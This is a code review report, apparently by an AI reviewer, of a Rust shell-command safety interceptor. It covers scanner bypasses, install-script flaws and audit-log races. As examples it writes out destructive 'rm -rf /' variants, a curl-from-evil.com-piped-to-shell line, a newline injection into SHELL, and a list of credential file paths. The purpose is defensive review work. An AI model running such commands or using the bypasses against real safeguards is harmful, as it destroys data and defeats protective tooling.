# Aegis Code Review

**Date:** 2026-04-21
**Depth:** Standard (per-file analysis with cross-module tracing for critical paths)
**Scope:** Full codebase — `src/interceptor/`, `src/audit/`, `src/config/`, `src/install.rs`, `src/main.rs`, `scripts/install.sh`, `scripts/uninstall.sh`

---

## Summary

The codebase is well-structured and demonstrates solid defensive design overall: the
scanner pipeline, parser segmentation, and audit logger are thoughtfully layered.
The majority of issues found are in two categories:

1. **Logic / false-negative gaps** in the parser and scanner that allow certain
   dangerous command forms to slip through as Safe or at a lower risk level than
   intended.
2. **Shell script correctness** issues in `install.sh` / `uninstall.sh`.

No hardcoded secrets, no SQL/command injection in the audit path, and no unsafe
use of `unwrap`/`expect` in non-test production code were found.

---

## Critical Issues

### CR-01: `extract_inline_scripts` scans only the first separator-delimited sub-command

**File:** `src/interceptor/parser/embedded_scripts.rs:298-319`

**Issue:** `extract_inline_scripts` calls `split_tokens(cmd)` which returns a flat
token list for the entire raw command, then walks it linearly. However `split_tokens`
also emits separator tokens (`&&`, `||`, `;`, `|`). The loop skips over separators
without resetting the interpreter-match state. The practical consequence is that
`extract_inline_scripts` works correctly for simple compound commands, but its
semantics are tightly coupled to the separator token being ignored rather than being
an explicit sub-command boundary. More importantly, it will **miss** a `-c` flag
or `-e` flag that appears in a **later** sub-command when the earlier sub-command
contains an interpreter name but no `-c`/`-e`, because the inner `position()` search
starts at index `i` (the interpreter position) and will find the first `-c`/`-e`
anywhere in the remaining token stream, possibly past a separator — assigning the
wrong body token to the wrong interpreter.

Example where this misfires:
```
python3 --version && node -e 'require("cp").execSync("rm -rf /")'
```
`split_tokens` → `["python3", "--version", "&&", "node", "-e", "require(...)"]`
At `i=0` (`python3`), the search for `-c` finds nothing (correct). At `i=3`
(`node`), the search for `-e` at `tokens[3..]` finds it at index 1 and body at
index 2 — this works. But if the python token happened to have `-e` somewhere after
it in a preceding sub-command the match would be stolen.

More critically, the `position` call searches forward for *any* occurrence of the
flag, which means it can cross sub-command boundaries and pair the wrong body:
```
python3 -c 'safe' && node -e 'bad payload'
```
Tokens: `["python3", "-c", "safe", "&&", "node", "-e", "bad payload"]`
At `i=0`, python3 finds `-c` at rel=1, body=`safe` — correct.
At `i=4`, node finds `-e` at rel=1, body=`bad payload` — correct.
But consider:
```
python3 --long-flag -e 'import os' && node -e 'bad'
```
At `i=0`, python3 finds `-e` at the position of `'import os'`, body=`import os`.
Then at `i=4`, node finds `-e` at rel=1, body=`bad`. This gives two results, one
of which is wrongly attributed to python3 with flag `-e` instead of `-c`, and may
miss the actual python3 body. The body is still scanned, so this is a labelling
issue but it can cause the wrong `InlineScript.interpreter` to be set, affecting
the `MAX_INLINE_SCRIPT_LEN` check which uses `script.interpreter` in its error
message and, more importantly, could cause the wrong script to be skipped in
future logic gated on `interpreter`.

**Fix:** Scope the flag search strictly within the current sub-command's token
range. Either split by separators first or stop `position()` at the first separator:

```rust
// After finding the interpreter at tokens[i], search only until the next separator
let subslice = tokens[i..].iter()
    .take_while(|t| !matches!(t.as_str(), ";" | "&&" | "||" | "|"))
    .collect::<Vec<_>>();
if let Some(rel) = subslice.iter().position(|t| t.as_str() == flag) {
    let body_idx = rel + 1;
    if let Some(body) = subslice.get(body_idx) {
        scripts.push(InlineScript { interpreter: interp.to_string(), body: (*body).clone() });
    }
}
```

---

### CR-02: `unwrap_subshell_group` does not verify balanced parentheses — wrongly strips unrelated trailing `)` 

**File:** `src/interceptor/parser/segmentation.rs:417-427`

**Issue:** `unwrap_subshell_group` strips the first `(` and last `)` from any
segment that starts with `(` and ends with `)`. It does not verify that these are a
matching pair. Consider:

```
(echo $(rm -rf /)
```

After `split_top_level_segments`, this segment will start with `(` and — because
`command_subst_depth` tracking closes the inner `$(...)` — may end with `)` which
is actually the closing paren of the `$()` substitution, not a subshell group
opener. When `unwrap_subshell_group` is then applied, it strips the outer `(` and
the final `)` (which belonged to the inner `$(...)`), producing a mangled inner
string that breaks the scanner's view of the payload.

More broadly, the heuristic `starts_with('(') && ends_with(')')` is not sufficient
to identify a true subshell group — `(a) && (b)` would be mis-identified as a
subshell wrapping `a) && (b`.

**Fix:** Add a paren-balance walk to confirm the closing `)` is the direct match
for the opening `(` at position 0:

```rust
fn unwrap_subshell_group(raw_segment: &str) -> Option<String> {
    let trimmed = raw_segment.trim();
    if !trimmed.starts_with('(') {
        return None;
    }
    // Walk to find the matching close paren for the first open paren
    let mut depth = 0i32;
    let mut close_idx = None;
    for (i, c) in trimmed.char_indices() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    close_idx = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    // Only unwrap when the matching close paren is at the very end
    if close_idx == Some(trimmed.len() - 1) {
        let inner = trimmed[1..trimmed.len() - 1].trim();
        if !inner.is_empty() {
            return Some(inner.to_string());
        }
    }
    None
}
```

---

### CR-03: `requires_recursive_scan` detection can be bypassed with backtick command substitution

**File:** `src/interceptor/scanner/recursive.rs:25-31`

**Issue:** `requires_recursive_scan` checks for `<<` (heredoc), `<(` (process
substitution), and `eval` tokens. It does **not** check for backtick command
substitution (`` ` ``). Commands like:

```sh
bash `echo -n "rm -rf /"`
bash -c `cat /tmp/payload`
```

will not trigger the recursive path and instead go through the simpler non-recursive
scan branch in `scan_targets`. While the raw string is still scanned by `full_scan`,
the backtick body is not extracted and scanned as an independent target, meaning
that if the outer command text does not itself trigger a pattern (because the
payload is encoded or indirect), the inner payload will be missed.

Separately, `extract_command_substitution_bodies` in `segmentation.rs` does handle
backtick bodies correctly — but that path is only reached via `logical_segments`
in the non-recursive branch, which does call `collect_scan_segments` recursively
and does call `extract_command_substitution_bodies`. So this finding is narrower:
backtick bodies ARE extracted by the non-recursive path through `collect_scan_segments`,
but only as segments joined by spaces — not individually fed back through the full
nested scan pipeline with heredoc/eval detection.

However, `requires_recursive_scan` also misses the case where a backtick body
contains `eval` or `<<`. For example:
```sh
bash -c `cat script_with_heredoc`
```
The backtick body is not inspected for heredoc markers, so those markers are not
recursively expanded.

**Fix:** Add `` ` `` to the `requires_recursive_scan` check:

```rust
fn requires_recursive_scan(cmd: &str) -> bool {
    cmd.contains("<<")
        || cmd.contains("<(")
        || cmd.contains('`')    // backtick command substitution
        || cmd.split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&'))
            .any(|token| token == "eval")
}
```

---

### CR-04: Double application of `normalize_legacy_fields` in `AuditLogger::append`

**File:** `src/audit/logger.rs:532-534`

**Issue:** In `AuditLogger::append`, `normalize_legacy_fields` is called **twice**
on the same entry:

```rust
let entry = self
    .apply_integrity(entry.normalize_legacy_fields(), prev_hash)?
    .normalize_legacy_fields();   // <-- second call
```

The first call is inside `apply_integrity`'s argument expression. The second call
is chained on the result. While `normalize_legacy_fields` is idempotent for most
fields, the `allowlist_matched` / `allowlist_effective` normalization logic has
conditional branching: it sets `allowlist_matched` to `Some(allowlist_present)` only
when it is `None`. After the first call these are no longer `None`, so the second
call is harmless in practice, but this is confusing and fragile — any future change
to `normalize_legacy_fields` that is not idempotent will silently introduce a bug.
Additionally, the double call adds unnecessary overhead on every append.

**Fix:** Remove the second `normalize_legacy_fields()` call:

```rust
let entry = self.apply_integrity(entry.normalize_legacy_fields(), prev_hash)?;
```

---

## Warnings

### WR-01: `install.sh` — TOCTOU between `load_settings` existence check and read

**File:** `src/install.rs:165-188`

**Issue:** `load_settings` calls `path.exists()` and then, in a separate operation,
`fs::read_to_string(path)`. Between these two calls another process could delete or
replace the file (TOCTOU race). On a multi-user system or in a CI environment where
multiple aegis installs run concurrently, this is a realistic scenario. The impact
is a misleading error message rather than silent data loss, but it could cause a
failed install with a confusing diagnostic.

**Fix:** Remove the existence check and handle `ErrorKind::NotFound` directly from
`fs::read_to_string`:

```rust
fn load_settings(path: &Path) -> Result<Value, String> {
    let raw = match fs::read_to_string(path) {
        Ok(raw) => raw,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
            return Ok(Value::Object(Map::new()));
        }
        Err(err) => return Err(format!("failed to read {}: {err}", path.display())),
    };
    // ...
}
```

---

### WR-02: `uninstall.sh` — `remove_shell_setup` uses non-atomic `cp` over the rc file

**File:** `scripts/uninstall.sh:84-94`

**Issue:** `remove_shell_setup` removes the managed block to a temp file, then uses
`cp "${tmp_rc}" "${rc_file}"`. Unlike a `mv`, `cp` is not atomic — if the process
is interrupted mid-copy (power loss, signal), the rc file is left in a truncated
state. This is the mirror image of `install.sh`'s `write_shell_setup` which also
uses `cp`. A truncated `.bashrc` or `.zshrc` will break the user's shell.

`install.sh:write_shell_setup` has the same problem at line 59.

**Fix:** Write to a temp file in the same filesystem, then rename atomically:

```sh
remove_shell_setup() {
    rc_file="$1"
    tmp_rc="${TMPDIR_AEGIS}/rc.tmp"

    [ -f "${rc_file}" ] || return

    remove_managed_block "${rc_file}" "${tmp_rc}"
    # Atomic replace — mv within the same filesystem is rename(2)
    mv "${tmp_rc}" "${rc_file}"
}
```

Apply the same change to `write_shell_setup` in `install.sh`.

---

### WR-03: `glob_to_regex` in allowlist converts `*` to `.*` (matches newlines by default)

**File:** `src/config/allowlist.rs:333-350`

**Issue:** The glob-to-regex converter maps `*` to `.*`. In Rust's `regex` crate,
`.` does **not** match newlines by default, so a pattern like `terraform destroy *`
will correctly refuse to match commands containing embedded newlines. However, the
`matches_pattern` method calls `self.regex.is_match(command.trim())` which only
trims whitespace from the command. If an attacker (or confused user) stores a
command with an embedded newline in the command string:
```
terraform destroy \nrm -rf /
```
the allowlist check would see `terraform destroy \nrm -rf /` — the `.*` in the
regex would not cross the newline, so the pattern correctly does not match.

The real concern is different: the `.*` in `^terraform destroy .*$` will match
`terraform destroy -auto-approve && rm -rf /` — allowing an entire compound
command to be auto-approved when only the first sub-command was intended to be
allowlisted. A pattern like `terraform destroy *` is semantically intended to
match `terraform destroy <flags>`, not `terraform destroy <anything including chained commands>`.

**Fix:** Document the limitation clearly or restrict the wildcard to non-separator
characters:

```rust
'*' => regex.push_str("[^;&|]+"),  // does not cross shell separators
```

This is a behaviour change and must be gated behind a config version bump or
surfaced as an explicit advisory warning when `*` is used in a pattern.

---

### WR-04: `is_shell_sink` only detects `sh` and `bash` — misses `zsh`, `dash`, `ksh`, `fish`

**File:** `src/interceptor/scanner/pipeline_semantics.rs:85-87`

**Issue:**

```rust
fn is_shell_sink(segment: &str) -> bool {
    matches!(first_token(segment).as_deref(), Some("sh") | Some("bash"))
}
```

PIPE-001 ("pipeline feeds data directly into sh/bash") will not fire for:
```
curl https://evil.com/install.sh | zsh
curl https://evil.com/install.sh | dash
curl https://evil.com/install.sh | ksh
```

The `extract_nested_commands` function in `nested_shells.rs` (line 40) already
enumerates `"bash" | "sh" | "dash" | "zsh" | "ksh" | "fish"`. `is_shell_sink`
should use the same set.

**Fix:**

```rust
fn is_shell_sink(segment: &str) -> bool {
    matches!(
        first_token(segment).as_deref(),
        Some("sh") | Some("bash") | Some("zsh") | Some("dash") | Some("ksh") | Some("fish")
    )
}
```

---

### WR-05: `AuditLock::exclusive` acquires the lock after `create_dir_all` — brief window without the lock

**File:** `src/audit/logger.rs:525-529`

**Issue:** In `AuditLogger::append`:

```rust
if let Some(parent) = self.path.parent() {
    fs::create_dir_all(parent)?;        // (1) create dir without lock
}
let _lock = AuditLock::exclusive(&self.lock_path())?;   // (2) then acquire lock
```

The lock file lives in the same directory as the audit file. `create_dir_all` runs
before the lock is acquired. In a concurrent scenario where two processes both call
`append` simultaneously on a freshly created audit directory, both can enter the
`create_dir_all` call. This is harmless for directory creation (it's idempotent)
but it means the lock is not held during the dir-creation window. The real concern
is that `latest_chained_hash` (step 3, after acquiring the lock) reads the existing
audit file to find the last hash. If both processes read the same "no prior hash"
state before either has written, both entries will have `prev_hash: None`,
breaking the integrity chain.

This is a narrow race — only matters when `integrity_mode = ChainSha256` and two
appends race immediately after a rotation. The lock acquisition at step (2) prevents
the body of the function from running concurrently, so the hash chain is protected
in the normal case. The dir creation race is harmless. This is a low-severity
correctness note rather than a production blocker.

**Fix (optional):** Document the race window in a comment, or restructure to acquire
the lock before creating the directory (at the cost of having to create the lock
file itself first, which is a chicken-and-egg problem). The current behaviour is
acceptable but worth noting.

---

### WR-06: `install.sh` — `write_shell_setup` does not validate `real_shell` path

**File:** `scripts/install.sh:51-67`

**Issue:** `write_shell_setup` writes `export AEGIS_REAL_SHELL="${real_shell}"` to
the rc file without validating that `real_shell` does not contain shell metacharacters
or newlines. If `AEGIS_REAL_SHELL` or `SHELL` is set to a malicious value (e.g.,
`/bin/bash\nexport EVIL=1`), the heredoc will embed that literal newline into the
rc file and cause unintended shell commands to execute on the next shell startup.

Although an attacker who can control `SHELL` likely already has code execution, the
defence-in-depth principle applies here.

**Fix:** Validate that `real_shell` contains no newlines or characters outside a
safe charset before writing:

```sh
validate_shell_path() {
    case "$1" in
        *$'\n'* | *';'* | *'&'* | *'|'* | *'`'* | *'$('*)
            fail "invalid real shell path: contains unsafe characters"
            ;;
    esac
}
```

Call `validate_shell_path "${real_shell}"` before `write_shell_setup`.

---

### WR-07: `keywords.rs` uses `.unwrap()` inside a guarded `Some(_)` arm — misleading pattern

**File:** `src/interceptor/scanner/keywords.rs:84` and `:114`

**Issue:**

```rust
Some(_) => {
    result.push(chars.next().unwrap());
}
```

The outer `match chars.peek()` arm is `Some(_)`, but the code then calls
`chars.next().unwrap()`. This is logically safe because `peek` confirmed the next
element exists, and `next()` on a `Peekable` after `peek` confirms `Some` will
return `Some`. However, the `unwrap()` is surprising to readers: the safe pattern
is `chars.next()` in the `Some(_)` arm using the peeked value directly, or using
`if let Some(c) = chars.next()`.

This is in the hot keyword-extraction path used at `Scanner::new()`. While it
cannot panic in practice, it violates the project convention of not using `.unwrap()`
in production paths.

**Fix:**

```rust
Some(_) => {
    if let Some(next_c) = chars.next() {
        result.push(next_c);
    }
}
```

---

## Info

### IN-01: `extract_inline_scripts` does not recognise `php -r` or `lua -e`

**File:** `src/interceptor/parser/embedded_scripts.rs:288-295`

The `EXEC-005A` test cases in `scanner/mod.rs` (lines 780-782) assert that
`ruby -e`, `php -r`, and `lua -e` are flagged as Warn. Those pattern IDs must fire
from the full regex scan, not from `extract_inline_scripts`. However, the inline
script body (the actual code) is never extracted for these interpreters, so if the
body itself contains a dangerous sub-command, it will not be escalated beyond Warn.
For consistency and defence in depth, add `("php", "-r")` and `("lua", "-e")` to
the `INTERPRETERS` table.

---

### IN-02: `uninstall.sh` — `TMPDIR_AEGIS` set after the `jq` availability check

**File:** `scripts/uninstall.sh:158-171`

`TMPDIR_AEGIS` is set at line 159 (`TMPDIR_AEGIS="$(mktemp -d)"`). The `jq`
check at lines 161-163 can call `fail` before `TMPDIR_AEGIS` is populated. Since
the `cleanup` trap references `TMPDIR_AEGIS`, if `mktemp -d` itself fails (disk
full), `TMPDIR_AEGIS` is empty and `cleanup` exits cleanly (the guard `[ -n "${TMPDIR_AEGIS:-}" ]` prevents the `rm -rf`). This is safe but the ordering could be
clearer: set `TMPDIR_AEGIS` before the first `fail`-able check, which is already
what the code does. No action needed — documenting for awareness only.

---

### IN-03: `temporary_settings_path` in `install.rs` includes nanoseconds but not entropy

**File:** `src/install.rs:287-295`

The temp file name is `{pid}-{nanos}.tmp`. On systems where `SystemTime::now()` has
low resolution (some virtual machines and containers clamp to 1-second granularity),
two concurrent aegis install invocations with the same PID recycled could collide.
`create_new(true)` in `write_settings_atomically` prevents silent overwrite — the
second process would fail with `AlreadyExists`. For a security tool installer this
is correct fail-safe behaviour but could cause a confusing error. Adding a random
component (e.g., from `/dev/urandom` or `rand`) would eliminate the collision, but
adding a new dependency is not justified. A note in the code documenting why
`create_new` is relied on as the collision guard is sufficient.

---

### IN-04: `main.rs` contains more business logic than the architecture prescribes

**File:** `src/main.rs`

`main.rs` is 63.9 KB, significantly larger than the "thin entry point" prescribed
by `CLAUDE.md` and `AEGIS.md`. While this is an architectural concern rather than
a bug, the concentration of policy evaluation, audit writing, snapshot orchestration,
and UI orchestration in `main.rs` makes the code harder to unit-test and increases
the blast radius of bugs. The existing module structure (`runtime.rs`, `decision.rs`,
`planning/`, etc.) suggests this refactoring has started but is incomplete.

---

### IN-05: `is_known_secret_path` is limited to two hardcoded paths

**File:** `src/interceptor/scanner/pipeline_semantics.rs:165-168`

```rust
fn is_known_secret_path(path: &str) -> bool {
    matches!(path, "~/.ssh/id_rsa" | "~/.aws/credentials")
}
```

Common sensitive paths not covered: `~/.ssh/id_ed25519`, `~/.ssh/id_ecdsa`,
`~/.kube/config`, `~/.config/gcloud/credentials.db`, `~/.netrc`. This is a
defence-in-depth improvement rather than a correctness bug (direct exfiltration
of these files via `cat | curl` is a real attack vector). Expand the list or switch
to a pattern-based approach.

---

*Reviewed: 2026-04-21*
*Reviewer: Claude (gsd-code-reviewer)*
*Depth: standard*
